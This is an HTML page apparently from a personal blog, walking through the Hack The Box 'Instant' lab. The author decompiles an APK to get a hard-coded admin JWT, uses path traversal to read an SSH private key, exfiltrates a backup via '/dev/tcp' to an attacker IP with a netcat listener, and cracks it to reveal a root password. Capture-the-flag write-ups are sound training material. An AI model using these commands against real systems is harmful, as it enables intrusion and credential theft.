@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Instant Writeup | Diego Chávez</title>
+    <link rel="stylesheet" href="../../styles/global.css" />
+    <link rel="stylesheet" href="../../styles/button.css" />
+    <link rel="stylesheet" href="../../styles/about.css" />
+    <link
+      rel="icon"
+      type="image/png"
+      href="https://api.iconify.design/simple-icons:hackthebox.svg?color=%23ff0000"
+    />
+    <style>
+      .writeup-img {
+        width: 100%;
+        max-width: 800px;
+        height: auto;
+        border-radius: 8px;
+        border: 1px solid rgba(89, 249, 255, 0.2);
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+        margin: 12px 0;
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <main class="content-wrapper" style="max-width: 900px; margin: 0 auto; padding: 40px 20px;">
+      
+      <!-- ENCABEZADO Y ETIQUETAS -->
+      <section class="hero" style="text-align: left; margin-bottom: 40px;">
+        <h1 style="color: var(--link-hover-color); font-size: 2.3rem; margin-bottom: 10px;">HTB: Instant</h1>
+        
+        <div class="tags" style="margin: 15px 0; display: flex; gap: 8px; flex-wrap: wrap;">
+          <span style="background: rgba(255,165,0,0.2); color: #ffa500; border: 1px solid rgba(255, 165, 0, 0.3); padding: 4px 10px; border-radius: 5px; font-size: 0.85rem; font-weight: bold;">#Medium</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#linux</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#apk</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#api</span>
+        </div>
+      </section>
+
+      <!-- CONTENIDO DEL WRITEUP -->
+      <article class="writeup-body" style="line-height: 1.8; color: #e2e8f0; display: flex; flex-direction: column; gap: 25px;">
+        
+        <div class="step-card" style="background: rgba(22, 2, 61, 0.4); padding: 25px; border-radius: 12px; border: 1px solid rgba(89, 249, 255, 0.15);">
+          
+          <p>First, we launch an ICMP ping to verify if the target machine is active.</p>
+          <img src="./images/Pasted image 20260408192447.png" alt="ICMP Ping Check" class="writeup-img" />
+          <p>As we can see, the TTL value is close to 64, confirming that the target is a Linux machine.</p>
+
+          <p style="margin-top: 15px;">Next, we perform a full port scan using Nmap:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.129.231.155 -oG allPorts</code></pre>
+          <p style="margin-top: 10px;">The open ports discovered are displayed below:</p>
+          <img src="./images/Pasted image 20260408192848.png" alt="Nmap Open Ports Scan Result" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We then run basic service enumeration scripts against the discovered ports:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">nmap -p22,80 -sCV 10.129.231.155 -oN targeted</code></pre>
+          <p style="margin-top: 10px;">Service scan results:</p>
+          <img src="./images/Pasted image 20260408193106.png" alt="Nmap Targeted Script Result" class="writeup-img" />
+
+          <p style="margin-top: 15px;">The output indicates virtual hosting is in use, so we add <code>instant.htb</code> to our <code>/etc/hosts</code> file:</p>
+          <img src="./images/Pasted image 20260408193451.png" alt="Hosts File Configuration" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Visiting the web application:</p>
+          <img src="./images/Pasted image 20260408193517.png" alt="Instant Wallet Web Application" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We run <code>whatweb</code> to fingerprint the underlying technologies:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">whatweb http://instant.htb/</code></pre>
+          <p style="margin-top: 10px;">The tool reports:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #e2e8f0;">http://instant.htb/ [200 OK] Apache[2.4.58], Bootstrap[4.0.0], Country[RESERVED][ZZ], Email[support@instant.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.129.231.155], JQuery[3.2.1], Script, Title[Instant Wallet]</code></pre>
+
+          <p style="margin-top: 15px;">Downloading the application installer provides an Android APK file. We decompile it using <code>apktool</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">apktool d instant.apk</code></pre>
+          <p style="margin-top: 10px;">Inspecting the application files recursively, we search for references to <code>instant.htb</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">grep -r "instant.htb" --color</code></pre>
+          <p style="margin-top: 10px;">This reveals several interesting subdomains and API endpoints:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #e2e8f0;">res/layout/activity_forgot_password.xml: Please contact support@instant.htb to have your account recovered
+res/xml/network_security_config.xml: mywalletv1.instant.htb
+res/xml/network_security_config.xml: swagger-ui.instant.htb
+smali/com/instantlabs/instant/ProfileActivity.smali: http://mywalletv1.instant.htb/api/v1/view/profile
+smali/com/instantlabs/instant/LoginActivity.smali: http://mywalletv1.instant.htb/api/v1/login
+smali/com/instantlabs/instant/RegisterActivity.smali: http://mywalletv1.instant.htb/api/v1/register
+smali/com/instantlabs/instant/TransactionActivity.smali: http://mywalletv1.instant.htb/api/v1/initiate/transaction
+smali/com/instantlabs/instant/TransactionActivity$2.smali: http://mywalletv1.instant.htb/api/v1/confirm/pin
+smali/com/instantlabs/instant/AdminActivities.smali: http://mywalletv1.instant.htb/api/v1/view/profile</code></pre>
+
+          <p style="margin-top: 15px;">We add these new discovered virtual hosts (`mywalletv1.instant.htb` and `swagger-ui.instant.htb`) to our <code>/etc/hosts</code> file:</p>
+          <img src="./images/Pasted image 20260408200139.png" alt="Updated Hosts File" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Initially, attempting to query endpoints on the Swagger UI directly fails due to missing authorization:</p>
+          <img src="./images/Pasted image 20260408200642.png" alt="Swagger UI Unauthorized Access" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We need an API Key / JWT token. Inspecting the smali file <code>smali/com/instantlabs/instant/AdminActivities.smali</code>:</p>
+          <img src="./images/Pasted image 20260408200834.png" alt="Hardcoded JWT in Smali Files" class="writeup-img" />
+
+          <p style="margin-top: 10px;">We successfully extract a hardcoded Administrator JWT token:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #e2e8f0;">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA</code></pre>
+
+          <p style="margin-top: 15px;">We apply the token in Swagger UI authorization:</p>
+          <img src="./images/Pasted image 20260408201008.png" alt="Swagger UI Authorization Setup" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Executing the log-reading administrative endpoint:</p>
+          <img src="./images/Pasted image 20260408201253.png" alt="Admin Read Log Endpoint Execution" class="writeup-img" />
+          <img src="./images/Pasted image 20260408201317.png" alt="Admin Log Read Result" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We leverage path traversal via the log reading parameter to extract the SSH private key for user <code>shirohige</code> (<code>../../../../../../home/shirohige/.ssh/id_rsa</code>):</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">curl -sX GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fshirohige%2F.ssh%2Fid_rsa" -H "accept: application/json" -H "Authorization: &lt;JWT_TOKEN&gt;" | jq '.["/home/shirohige/logs/../../../../../../home/shirohige/.ssh/id_rsa"][]' | tr -d '"' | sed 's/\\n//' > id_rsa
+chmod 600 id_rsa</code></pre>
+
+          <p style="margin-top: 15px;">Using the retrieved private key, we connect to the machine via SSH as user <code>shirohige</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">ssh -i id_rsa shirohige@10.129.231.155</code></pre>
+
+          <p style="margin-top: 10px;">We successfully obtain the first user flag:</p>
+          <img src="./images/Pasted image 20260408203659.png" alt="User Flag Retrieval" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Further enumeration for privilege escalation yields no direct SUID binaries or capabilities:</p>
+          <img src="./images/Pasted image 20260408204033.png" alt="SUID Enumeration" class="writeup-img" />
+          <img src="./images/Pasted image 20260408204339.png" alt="Capabilities Enumeration" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Inspecting running processes using <code>ps -faux</code> reveals Python applications running under <code>shirohige</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #e2e8f0;">shirohi+ 1332 0.0 2.7 62664 53412 ? Ss 01:21 0:01 /home/shirohige/projects/mywallet/myenv/bin/python3 app.py
+shirohi+ 1336 0.0 3.0 215496 59888 ? Ss 01:21 0:01 /home/shirohige/projects/mywallet/myenv/bin/python3 serve.py</code></pre>
+
+          <p style="margin-top: 15px;">Searching for files owned by <code>shirohige</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">find / -user shirohige 2>/dev/null | grep -vE "cgroup|shirohige"</code></pre>
+          <img src="./images/Pasted image 20260408205305.png" alt="Files Owned by Shirohige" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Navigating to the backups directory:</p>
+          <img src="./images/Pasted image 20260408205552.png" alt="Backups Directory Inspection" class="writeup-img" />
+          <p style="margin-top: 10px;">We locate an encrypted Solar-PuTTY sessions backup file named <code>sessions-backup.dat</code>.</p>
+
+          <p style="margin-top: 15px;">We transfer <code>sessions-backup.dat</code> to our attacking machine using netcat:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;"># On victim:
+cat &lt; sessions-backup.dat &gt; /dev/tcp/10.10.16.167/443
+
+# On attacker:
+nc -nlvp 443 &gt; sessions-backup.dat</code></pre>
+
+          <p style="margin-top: 15px;">We decrypt the backup using a Solar-PuTTY decryption Python script alongside <code>rockyou.txt</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">python3 SolarPuttyDecrypt.py sessions-backup.dat /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt</code></pre>
+          <p style="margin-top: 10px;">The script successfully cracks the archive password: <code>estrella</code>.</p>
+
+fmt
+          <p style="margin-top: 15px;">Formatting the resulting JSON output:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">python3 SolarPuttyDecrypt.py sessions-backup.dat /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt | tail -n 1 | jq</code></pre>
+          
+          <p style="margin-top: 10px;">This outputs root credentials stored within the session profiles:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #e2e8f0;">{
+  "Sessions": [ ... ],
+  "Credentials": [
+    {
+      "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
+      "CredentialsName": "instant-root",
+      "Username": "root",
+      "Password": "12**24nzC!r0c%q12",
+      ...
+    }
+  ],
+  ...
+}</code></pre>
+
+          <p style="margin-top: 15px;">Using the discovered root password, we escalate privileges to root:</p>
+          <img src="./images/Pasted image 20260408214126.png" alt="Root Privilege Escalation Success" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We retrieve the final root flag:</p>
+          <img src="./images/Pasted image 20260408214153.png" alt="Root Flag Retrieval" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Challenge completed successfully:</p>
+          <img src="./images/Pasted image 20260408214609.png" alt="Challenge Complete Confirmation" class="writeup-img" />
+
+        </div>
+
+      </article>
+
+      <!-- BOTONES DE NAVEGACIÓN -->
+      <div class="button-container" style="margin-top: 40px; display: flex; justify-content: center; gap: 15px;">
+        <a href="writeups.html" class="button-33" role="button">Back to Writeups</a>
+        <a href="../../" class="button-33" role="button">Back home</a>
+      </div>
+
+    </main>
+  </body>
+</html>
